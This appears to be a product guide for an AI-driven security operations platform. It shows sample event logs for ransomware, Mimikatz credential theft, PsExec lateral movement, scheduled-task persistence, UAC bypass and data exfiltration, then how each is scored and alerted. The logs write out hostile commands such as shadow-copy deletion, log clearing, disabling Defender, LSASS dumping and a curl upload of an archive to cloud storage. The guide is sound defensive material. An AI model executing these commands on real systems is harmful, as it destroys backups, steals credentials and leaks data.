# 📚 Real Attack Examples & How They're Detected

This guide shows real-world attack patterns and how the AI SOC platform detects them.

---

## Quick Reference Table

| Attack Type | Signals Detected | Threat Score | MITRE Tags |
|-------------|------------------|--------------|-----------|
| **Ransomware** | File encryption, shadow copy deletion | 85-95 | T1486, T1490 |
| **Credential Theft** | LSASS access, mimikatz | 80-90 | T1003 |
| **Lateral Movement** | PsExec, WMI execution, SMB | 75-85 | T1021 |
| **Persistence** | Registry mods, scheduled tasks, WMI | 65-80 | T1547, T1053 |
| **Data Exfiltration** | Large outbound transfers | 70-85 | T1041 |
| **Privilege Escalation** | UAC bypass, token elevation | 75-90 | T1548, T1055 |
| **Defense Evasion** | Log deletion, unsigned binaries | 60-75 | T1070, T1112 |

---

# 🔴 ATTACK 1: RANSOMWARE (CONTI)

**Real-World Context**: Conti is one of the most active ransomware groups

### What Happens in an Attack:

```
Step 1: Reconnaissance      → whoami /priv, net user /domain
        ↓
Step 2: Credential Theft    → lsass.exe dumping, mimikatz
        ↓
Step 3: Lateral Movement    → psexec to other servers
        ↓
Step 4: Defense Evasion     → Stop Windows Defender, clear logs
        ↓
Step 5: Impact              → Encrypt files, delete backups
        ↓
Step 6: Demand Ransom       → Leave note, cut off access
```

### Detected Events:

```json
{
  "host_id": "DESKTOP-USER",
  "user_id": "john.doe",
  "events": [
    {
      "event_type": "process_spawn",
      "command_line": "whoami /priv",
      "comment": "🔴 Reconnaissance - checking permissions"
    },
    {
      "event_type": "process_spawn",
      "command_line": "net user /domain",
      "comment": "🔴 Reconnaissance - mapping domain users"
    },
    {
      "event_type": "process_spawn",
      "command_line": "net localgroup administrators",
      "comment": "🔴 Reconnaissance - checking admin accounts"
    },
    {
      "event_type": "process_spawn",
      "command_line": "sc.exe stop WinDefend",
      "comment": "🔴 Defense Evasion - disabling Windows Defender"
    },
    {
      "event_type": "process_spawn",
      "command_line": "wevtutil.exe cl System",
      "comment": "🔴 Defense Evasion - clearing event logs"
    },
    {
      "event_type": "process_spawn",
      "command_line": "vssadmin delete shadows /all /quiet",
      "comment": "🔴 Impact - deleting backup copies"
    },
    {
      "event_type": "file_write",
      "path": "C:\\Users\\john\\Documents\\report.docx.locked",
      "comment": "🔴 Impact - file being encrypted with .locked extension"
    },
    {
      "event_type": "file_write",
      "path": "C:\\Users\\john\\Desktop\\budget.xlsx.locked",
      "comment": "🔴 Impact - more file encryption"
    },
    {
      "event_type": "file_write",
      "path": "C:\\Users\\john\\Documents\\README.txt",
      "comment": "🔴 Impact - ransom note being created"
    },
    {
      "event_type": "network_flow",
      "destination": "185.220.101.10",
      "bytes_sent": 104857600,
      "comment": "🔴 Impact - 100MB stolen data being sent to attacker"
    }
  ]
}
```

### How AI SOC Detects This:

**Feature Extraction (40 features)**:
```
recon_count = 3           ← Multiple whoami, net user commands
lsass_hits = 0            ← None in this example
service_mods = 1          ← Stopping WinDefend
log_clear = 1             ← wevtutil clearing logs
shadow_delete_hits = 1    ← vssadmin delete shadows
encrypt_ext_hits = 2      ← .locked extensions detected
entropy_spike_count = 0   ← Not shown in log, but would be high
net_bytes_out_mb = 100    ← Large data transfer
```

**ML Scoring**:
```
Isolation Forest: 88/100   (Anomalous behavior)
Random Forest: 85/100      (Pattern matches known ransomware)
Gradient Boosting: 92/100  (Sequence of events is malicious)
Neural Network: 87/100
Linear Classifier: 83/100

Weighted Score = (88×0.15) + (85×0.30) + (92×0.25) + (87×0.20) + (83×0.10) = 87.2/100
```

**Rule Matches**:
```
✓ SIG-012 triggered: Shadow copy deletion (T1486, T1490)
✓ SIG-002 triggered: Event log clearing (T1070)
✓ SIG-003 triggered: Service disabling (T1489)
✓ SIG-005 triggered: Ransomware extensions (T1486)
```

**Final Alert**:
```json
{
  "incident_id": "INC-RANSOMWARE-2026-001",
  "score": 87.2,
  "threat": "CRITICAL",
  "behavior_tags": ["RANSOMWARE", "SHADOW_COPY_DELETION", "DATA_EXFILTRATION"],
  "actions": ["ISOLATE_HOST", "BLOCK_EGRESS", "SNAPSHOT_MEMORY", "DISABLE_TOKENS"],
  "mitre": ["T1486", "T1490", "T1070", "T1489"],
  "explanation": "Files are being encrypted and backups deleted. This is a confirmed ransomware attack."
}
```

**Human Translation**:
> 🚨 CRITICAL: An active ransomware attack is happening on DESKTOP-USER! Files are being encrypted, backups are being deleted, and about 100MB of data is being stolen. IMMEDIATE ACTION REQUIRED: Isolate this computer now!

---

# 🔴 ATTACK 2: CREDENTIAL THEFT (MIMIKATZ)

**Real-World Context**: Attackers steal admin credentials to escalate privileges

### Attack Sequence:

```
Attacker gets initial access (phishing, RDP)
         ↓
Attacker runs Mimikatz to dump LSASS
         ↓
Attacker gets admin passwords from memory
         ↓
Attacker uses credentials for lateral movement
         ↓
Full domain compromise
```

### Detected Events:

```json
{
  "host_id": "DESKTOP-ADMIN",
  "user_id": "admin",
  "events": [
    {
      "event_type": "process_spawn",
      "command_line": "mimikatz.exe",
      "comment": "🔴 Mimikatz tool being launched"
    },
    {
      "event_type": "process_spawn",
      "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp",
      "comment": "🔴 Dumping LSASS process memory (contains credentials)"
    },
    {
      "event_type": "process_spawn",
      "command_line": "powershell -Command \"Out-Minidump -Process lsass\"",
      "comment": "🔴 Alternative method to dump credentials"
    },
    {
      "event_type": "file_write",
      "path": "C:\\temp\\lsass.dmp",
      "comment": "🔴 Credential dump file being created"
    }
  ]
}
```

### How AI SOC Detects This:

**Key Indicators**:
```
lsass_hits = 3            ← 3 credential dumping attempts
Process names match malware database
No legitimate reason to access LSASS
Procdump + lsass combination = 98% confidence attack
```

**Rule Match**:
```
✓ SIG-001 triggered: LSASS credential dumping (T1003)
Detected: mimikatz.exe (known malware signature)
Detected: procdump with lsass argument
```

**Result**:
```json
{
  "score": 92.1,
  "threat": "CRITICAL",
  "behavior_tags": ["PRIVILEGE_ESCALATION", "CREDENTIAL_THEFT"],
  "actions": ["ISOLATE_HOST", "INVALIDATE_SESSIONS", "FORCE_PASSWORD_RESET"],
  "mitre": ["T1003"],
  "explanation": "Attacker is stealing admin passwords from memory using Mimikatz."
}
```

---

# 🟠 ATTACK 3: LATERAL MOVEMENT (PSEXEC)

**Real-World Context**: After getting one computer, attackers spread to others

### Attack Pattern:

```
Compromised Computer A
         ↓
Attacker discovers Computer B exists (recon)
         ↓
Attacker uses stolen admin credentials
         ↓
Attacker uses PsExec to remotely execute commands on Computer B
         ↓
Computer B is now compromised
         ↓
Repeat on Computer C, D, E...
```

### Detected Events:

```json
{
  "host_id": "SERVER-FILE-01",
  "user_id": "attacker",
  "events": [
    {
      "event_type": "process_spawn",
      "command_line": "psexec \\\\SERVER-DB-01 cmd.exe",
      "comment": "🔴 PsExec attempting remote execution"
    },
    {
      "event_type": "process_spawn",
      "command_line": "wmic /node:SERVER-WEB-01 process call create \"cmd.exe\"",
      "comment": "🔴 WMIC alternative for remote execution"
    },
    {
      "event_type": "process_spawn",
      "command_line": "Enter-PSSession -ComputerName SERVER-APP-01",
      "comment": "🔴 PowerShell remote session to another server"
    },
    {
      "event_type": "network_flow",
      "destination": "10.0.1.50",
      "comment": "🔴 Network connection to internal server"
    }
  ]
}
```

### How AI SOC Detects This:

**Features**:
```
lateral_spread = 3        ← Multiple remote execution attempts
net_unique_destinations = 3  ← Connecting to multiple servers
unusual_remote_tools = true  ← PsExec, WMIC, WinRM detected
```

**Rule Match**:
```
✓ SIG-004 triggered: Lateral movement tools (T1021)
Detected: PsExec command
Detected: WMIC remote execution
Detected: PowerShell remoting
```

**Result**:
```json
{
  "score": 78.5,
  "threat": "HIGH",
  "behavior_tags": ["LATERAL_MOVEMENT", "INTERNAL_RECONNAISSANCE"],
  "actions": ["BLOCK_LATERAL_PATHS", "MONITOR_TARGETS", "INCREASE_SAMPLING"],
  "mitre": ["T1021"],
  "explanation": "Attacker is trying to spread from one server to multiple others."
}
```

---

# 🟠 ATTACK 4: PERSISTENCE (SCHEDULED TASK BACKDOOR)

**Real-World Context**: Create a hidden way back in for future attacks

### Attack Pattern:

```
Attacker has initial access
         ↓
Attacker wants to ensure future access
         ↓
Attacker creates hidden scheduled task
         ↓
Task runs malware every day at 3 AM
         ↓
Even if admin closes attacker access, backdoor runs
         ↓
Attacker can reconnect anytime
```

### Detected Events:

```json
{
  "host_id": "DESKTOP-IMPORTANT",
  "user_id": "attacker",
  "events": [
    {
      "event_type": "process_spawn",
      "command_line": "schtasks /create /tn SystemUpdate /tr C:\\Users\\Public\\update.exe /sc daily /st 03:00:00",
      "comment": "🔴 Creating a hidden scheduled task to run malware daily"
    },
    {
      "event_type": "registry_write",
      "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "comment": "🔴 Adding to Windows startup registry"
    },
    {
      "event_type": "registry_write",
      "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
      "comment": "🔴 Adding to Run Once registry (runs once at startup)"
    }
  ]
}
```

### How AI SOC Detects This:

**Features**:
```
persistence_hits = 2      ← Multiple persistence mechanisms
sched_task_hits = 1       ← Scheduled task creation
reg_tamper_hits = 2       ← Registry persistence attempts
```

**Rule Matches**:
```
✓ SIG-007 triggered: Registry persistence (T1547)
✓ SIG-008 triggered: Scheduled task creation (T1053)
```

**Result**:
```json
{
  "score": 72.3,
  "threat": "HIGH",
  "behavior_tags": ["PERSISTENCE_ESTABLISHED"],
  "actions": ["REMOVE_SCHEDULED_TASKS", "AUDIT_REGISTRY", "ENDPOINT_REVIEW"],
  "mitre": ["T1547", "T1053"],
  "explanation": "Attacker is installing backdoors to ensure future access."
}
```

---

# 🟡 ATTACK 5: PRIVILEGE ESCALATION (UAC BYPASS)

**Real-World Context**: User account is compromised, attacker needs admin level

### Attack Pattern:

```
User account compromised (low privilege)
         ↓
Attacker wants admin rights
         ↓
Attacker exploits Windows to bypass UAC (User Account Control)
         ↓
Attacker gains System/Admin level access
         ↓
Full system compromise
```

### Detected Events:

```json
{
  "host_id": "LAPTOP-USER",
  "user_id": "user",
  "events": [
    {
      "event_type": "process_spawn",
      "command_line": "fodhelper.exe",
      "comment": "🔴 Fodhelper UAC bypass technique"
    },
    {
      "event_type": "registry_write",
      "registry_key": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
      "comment": "🔴 Setting up registry for UAC bypass"
    },
    {
      "event_type": "process_spawn",
      "command_line": "eventvwr.exe",
      "comment": "🔴 Another UAC bypass tool"
    },
    {
      "event_type": "token_elevation",
      "integrity_level": "System",
      "previous_level": "Medium",
      "comment": "🔴 Process elevated from Medium to System integrity level"
    }
  ]
}
```

### How AI SOC Detects This:

**Features**:
```
uac_hits = 2              ← UAC bypass attempts
integrity_jump_hits = 1   ← Permission elevation detected
```

**Rule Match**:
```
✓ UAC bypass patterns detected (fodhelper, eventvwr)
✓ Token elevation privilege increase observed
```

**Result**:
```json
{
  "score": 81.6,
  "threat": "HIGH",
  "behavior_tags": ["PRIVILEGE_ESCALATION", "INTEGRITY_LEVEL_JUMP"],
  "actions": ["ALERT_ANALYST", "INCREASE_MONITORING"],
  "mitre": ["T1548"],
  "explanation": "Attacker is trying to elevate from user to admin level."
}
```

---

# 🟡 ATTACK 6: DATA EXFILTRATION (INSIDER THREAT PATTERN)

**Real-World Context**: Stealing large amounts of data for financial gain

### Attack Pattern:

```
Legitimate user access (employee, contractor)
         ↓
User downloads large amounts of files
         ↓
User archives them (ZIP, RAR, 7z)
         ↓
User uploads to cloud storage (mega.nz, gdrive)
         ↓
User deletes local copies
         ↓
Data is gone
```

### Detected Events:

```json
{
  "host_id": "DESKTOP-FINANCE",
  "user_id": "finance.analyst",
  "events": [
    {
      "event_type": "file_write",
      "path": "C:\\Users\\finance.analyst\\Documents\\archive_backup.zip",
      "comment": "🔴 Large ZIP file being created"
    },
    {
      "event_type": "file_write",
      "path": "C:\\Users\\finance.analyst\\Desktop\\Q4_reports.zip",
      "comment": "🔴 More sensitive files being zipped"
    },
    {
      "event_type": "process_spawn",
      "command_line": "curl -X POST https://mega.nz/api/v2/upload -d @C:\\archive.zip",
      "comment": "🔴 File being uploaded to external cloud storage"
    },
    {
      "event_type": "network_flow",
      "destination": "mega.nz",
      "bytes_sent": 2147483648,
      "comment": "🔴 2GB of data being sent to external site"
    },
    {
      "event_type": "file_delete",
      "path": "C:\\Users\\finance.analyst\\Documents\\archive_backup.zip",
      "comment": "🔴 Covering tracks - deleting local copy"
    }
  ]
}
```

### How AI SOC Detects This:

**Features**:
```
file_write_rate_5m = 150  ← Rapid file creation
net_bytes_out_mb = 2048   ← 2GB outbound transfer
file_delete_rate_5m = 45  ← Rapid file deletion (cleanup)
suspicious_domains = 1    ← mega.nz is known exfil site
```

**Result**:
```json
{
  "score": 84.2,
  "threat": "HIGH",
  "behavior_tags": ["DATA_EXFILTRATION", "INSIDER_THREAT"],
  "actions": ["BLOCK_EGRESS", "PRESERVE_EVIDENCE", "NOTIFY_MANAGEMENT"],
  "mitre": ["T1041"],
  "explanation": "Large amounts of sensitive data are being stolen and sent outside the organization."
}
```

---

# 🟢 BENIGN EXAMPLES (Should NOT Alert)

### Normal User Activity:

```json
{
  "host_id": "LAPTOP-USER",
  "user_id": "john.doe",
  "events": [
    {
      "event_type": "process_spawn",
      "command_line": "notepad.exe C:\\notes.txt",
      "comment": "✅ Opening text editor - normal"
    },
    {
      "event_type": "process_spawn",
      "command_line": "explorer.exe",
      "comment": "✅ Opening file explorer - normal"
    },
    {
      "event_type": "file_write",
      "path": "C:\\Users\\john\\Documents\\report.docx",
      "comment": "✅ Saving a document - normal"
    },
    {
      "event_type": "process_spawn",
      "command_line": "chrome.exe",
      "comment": "✅ Opening browser - normal"
    }
  ]
}
```

**Result**:
```
✅ Score: 12.3/100 (CLEAN)
✅ No alert generated
✅ Normal user activity detected
```

### Admin Maintenance (Legitimate):

```json
{
  "host_id": "SERVER-01",
  "user_id": "admin",
  "events": [
    {
      "event_type": "process_spawn",
      "command_line": "tasklist /v",
      "comment": "✅ Admin checking running processes - normal admin task"
    },
    {
      "event_type": "process_spawn",
      "command_line": "ipconfig /all",
      "comment": "✅ Checking network config - normal admin task"
    },
    {
      "event_type": "process_spawn",
      "command_line": "net user newadmin /add",
      "comment": "⚠️ Could be suspicious, but during maintenance window it's okay"
    }
  ]
}
```

**Result**:
```
⚠️ Score: 35.2/100 (Slightly suspicious but not alert threshold)
⚠️ Depends on context (is it during scheduled maintenance?)
```

---

# 📊 Quick Reference: Attack vs Benign

## High-Risk Events (Almost Always Malicious):
- ✗ Mimikatz running
- ✗ PsExec to other machines
- ✗ LSASS memory dumping
- ✗ Ransomware file extensions
- ✗ Shadow copy deletion + file encryption
- ✗ wevtutil clearing logs + service stop
- ✗ Encoded PowerShell + outbound connection

## Medium-Risk Events (Context Matters):
- ~ Scheduled task creation (admin can do this)
- ~ Registry modifications (could be software install)
- ~ Large file transfers (could be backup)
- ~ Process enumeration (could be monitoring tool)

## Low-Risk Events (Usually Benign):
- ✓ Opening applications
- ✓ File creation in Documents
- ✓ Normal network traffic
- ✓ Windows updates

---

**For more information, see the API_GUIDE.md and QUICKSTART.md**
